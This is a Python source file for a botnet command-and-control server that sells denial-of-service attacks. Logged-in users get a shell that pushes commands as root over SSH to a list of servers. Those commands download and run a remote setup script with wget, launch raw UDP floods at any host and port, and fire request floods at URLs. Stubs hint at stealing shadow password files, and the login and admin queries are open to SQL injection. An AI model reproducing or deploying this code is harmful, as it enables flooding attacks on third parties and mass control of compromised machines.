import os
import sys
import time
import socket
import threading
from pssh.pssh2_client import ParallelSSHClient
from datetime import datetime
import MySQLdb
import random
import string
import hashlib
import binascii
import base64

threads = 0

syntax_prefix = "-"
class puts:

    @staticmethod
    def err(string):
        sys.stderr.write(string + "\n")

    @staticmethod
    def out(string):
        sys.stdout.write(string + "\n")


def client(date, conn, addr):
    global threads
    admin = False
    banned = False
    premium = False
    isValidAccount = False
    active_users = []
    hosts = []
    try:
        file = open("/var/log/Paison/ssh_servers.txt", "r")
        for line in file:
            hosts.append(line.strip("\r\n"))

        conn.send("Your IP Address: \033[32m{} \033[0mHas been logged. \r\n\033[31mEverything you do will be logged.\r\n".format(addr[0]))
        puts.out("     - prompting client with login")
        conn.send("\033[0mu\033[31ms\033[32me\033[1;36mr\033[35mn\033[37ma\033[31mm\033[33me\033[0m: ")
        username = conn.recv(1024).strip("\r\n")
        puts.out("     - client sent username: %s" % (username))
        conn.send("\033[0mp\033[31ma\033[32ms\033[1;36ms\033[35mw\033[37mo\033[31mr\033[33md\033[0m: ")
        password = conn.recv(1024).strip("\r\n")
        puts.out("     - client sent password: %s" % (password))

        db = MySQLdb.connect(host="localhost", user="root", passwd="SET PASSWORD", db="paison")
        cur = db.cursor()

        cur.execute("SELECT * FROM `users` WHERE username=\"%s\" AND password=\"%s\"" % (username, password))
        row = cur.fetchall()
        if (row):
            isValidAccount = True
        
            if (row[0][3] == 1):
                admin = True
            elif (row[0][4] == 1):
                banned = True
            elif (row[0][5] == 1):
                premium = True

        elif (not row):
            isValidAccount = False

        if (isValidAccount == True and banned == False):
            puts.out("     - loaded client with %d servers" % (len(hosts)))
            active_users.append(username)
            conn.send("\033[2J\033[1;1H")
            conn.send("servers loaded [%s]\r\n"% (len(hosts)))
            while True:
                try:
                    conn.send("\033[0m[root@%s]~# " % (username))
                    nCmd = conn.recv(1024).strip("\r\n")
                    #blank = conn.recv(1024)
                    if (not nCmd):
                        continue
                    f_cmd = open("/var/log/Paison/Logs/commands.log", "a").write("[{}] user {} executed {} [{}:{}]\n".format(date, username, nCmd, addr[0], addr[1]))

                    xCmd = nCmd.split(' ')

                    #   Install Setup Function
                    #- Installs requirements.        
                    if (xCmd[0] == syntax_prefix+"install" and admin == True):
                        ip = "SET IP"
                        payload_install = "wget http://%s/html/setup.sh -O /tmp/setup.sh; sh /tmp/setup.sh; rm -rf /tmp/setup.sh; python /var/www/html/feed.py %s installed_req" % (ip, ip)
                        try:
                            client = ParallelSSHClient(hosts, user="root", password="NotAHakr", port=22, timeout=10)
                            output = client.run_command(payload_install)
                        except Exception as e:
                            puts.out("     - " + str(e))

                    elif (xCmd[0] == syntax_prefix+"adduser" and admin == True):
                        username = xCmd[1]
                        password = xCmd[2]
                        isAdmin  = xCmd[3]
                        cur.execute("INSERT INTO `users` VALUES (NULL, \"%s\", \"%s\", \"%s\");" % (username, password, isAdmin))

                    elif (xCmd[0] == syntax_prefix+"deluser" and admin == True):
                        username = xCmd[1]
                        cur.execute("DELETE FROM `users` WHERE username='%s';" % (username))

                    elif (xCmd[0] == syntax_prefix+"premuser" and admin == True):
                        username = xCmd[1]
                        cur.execute("UPDATE `users` SET premium=1 WHERE username='%s';" % (username))

                    elif (xCmd[0] == syntax_prefix+"banuser" and admin == True):
                        username = xCmd[1]
                        cur.execute("UPDATE `users` SET banned=1 WHERE username='%s';" % (username))
                    
                    elif (xCmd[0] == syntax_prefix+"unbanuser" and admin == True):
                        username = xCmd[1]
                        cur.execute("UPDATE `users` SET banned=0 WHERE username='%s';" % (username))

                    elif (xCmd[0] == syntax_prefix+"changepass" and admin == True):
                        username = xCmd[1]
                        new_pass = xCmd[2]
                        cur.execute("UPDATE `users` SET password='%s' WHERE username='%s';" % (new_pass, username))

                    elif (xCmd[0] == syntax_prefix+"raw_udp" and premium == True or admin == True):
                        ip = "SET IP"
                        DEST_HOST = xCmd[1]
                        DEST_PORT = int(xCmd[2])
                        BYTES_PS = int(xCmd[3])    
                        TIME_AMT = int(xCmd[4])
                        
                        payload_udp = "screen -S raw_udp -dm bash -c 'python raw.py %s %s %s %s'; python feed.py %s raw_udp" % (DEST_HOST, DEST_PORT, BYTES_PS, TIME_AMT, ip)
                        nHosts = []
                        nHosts.append(hosts[1], hosts[4]) # Add hosts by index. leave 'hosts' to use all servers.
                        try:
                            client = ParallelSSHClient(nHosts, user="root", password="NotAHakr", port=22, timeout=10)
                            client.run_command(payload_udp)
                        except Exception as e:
                            puts.out("     - " + str(e))

                    elif (xCmd[0] == syntax_prefix+"bserv_simple" and premium == True or admin == True):
                        target = xCmd[1]
                        usern = xCmd[2]
                        passw = xCmd[3]

                    elif (xCmd[0] == syntax_prefix+"bserv_adv" and premium == True or admin == True):
                        target = xCmd[1]
                        usern = xCmd[2]
                        passw = xCmd[3]

                        def sendShadow(plaintext, hash, target, usern, passw):
                            pass

                        def getShadowFormat(target, usern, passw):
                            pass

                    elif (xCmd[0] == syntax_prefix+"clear"):
                        conn.send('\033[2J\033[1;1H')

                    elif (xCmd[0] == syntax_prefix+"threads"):
                        conn.send("Active Threads [%d]\r\n" % (threads))

                    elif (xCmd[0] == syntax_prefix+"logout"):
                        conn.close()

                    elif (xCmd[0] == syntax_prefix+"pbin"):
                        ip = "SET IP"
                        URL = xCmd[1]
                        Total_Requests = xCmd[2]
                        Wait_Time = xCmd[3]

                        payload_pbin = "screen -S req -dm bash -c 'python /var/www/html/send.py %s %s %s'; python feed.py %s pbin_bot" % (URL, Total_Requests, Wait_Time, ip)
                                
                        try:
                            client = ParallelSSHClient(hosts, user="root", password="NotAHakr", port=22, timeout=10)
                            client.run_command(payload_pbin)

                        except Exception as e:
                            puts.out("     - " + str(e))

                    elif (xCmd[0] == syntax_prefix+"randpass"):
                        length = int(xCmd[1])
                        conn.send("".join(random.choice(string.lowercase + string.uppercase + string.digits) for x in range(length)))
                        conn.send("\r\n")

                except Exception as e:
                    puts.out("     - " + str(e))
                    conn.send("Invalid Syntax\r\n"); pass
                    f_cmd = open("/var/log/Paison/Logs/commands.log", "a").write("[{}] user {} executed invalid syntax {} [{}:{}]\n".format(date, username, nCmd, addr[0], addr[1]))

        elif (isValidAccount == False or banned == True):
            conn.send("\033[31mFailed Login\r\n")
            f_acc = open("/var/log/Paison/Logs/failed_logins.log", "a").write("[{}] failed logging into account with username {} [{}:{}]\n".format(date, username, addr[0], addr[1]))
            conn.close()

    except Exception as e:
        puts.out("      - " + str(e))
        threads -= 1
        active_users.remove(username)
        puts.out("     - client disconnected {}:{}".format(addr[0], addr[1]))
        if (conn):
            conn.close()

def server():
    global threads
    now = datetime.now()
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(("0.0.0.0", 3333))
    except socket.error:
        puts.err("[-] Socket Error: Failed to bind to address, Address already in use.")

    sock.listen(0)
    while True: # creating infinite while loop to run forever until error
        try:
            conn, addr = sock.accept()
            puts.out("[+] Connection Recieved. Forwarding client to shell. {}:{}".format(addr[0], addr[1]))
            f_con = open("/var/log/Paison/Logs/connections.log", "a").write("[{}] connected with address [{}:{}]\n".format(now, addr[0], addr[1]))
            try:
                if (threads == 100):
                    threads -= 1
                    puts.out("     - could not set client to shell. maximum threads used.")
                    conn.close()
                    continue
                
                threading.Thread(target=client, args=(now, conn, addr,)).start()
                threads += 1
                
            except Exception:
                puts.err("     - could not send client. error occured.")
                f_con = open("/var/log/Paison/Logs/connections.log", "a").write("[{}] failed to send user to shell [{}:{}]\n".format(now, addr[0], addr[1]))
            
            puts.out("     - sent client to shell.")
            f_con = open("/var/log/Paison/Logs/connections.log", "a").write("[{}] sent user to shell [{}:{}]\n".format(now, addr[0], addr[1]))
            

        except socket.error as e:
            puts.err("[-] Socket Error: Unknown error occured\n%s" + str(e))


server()
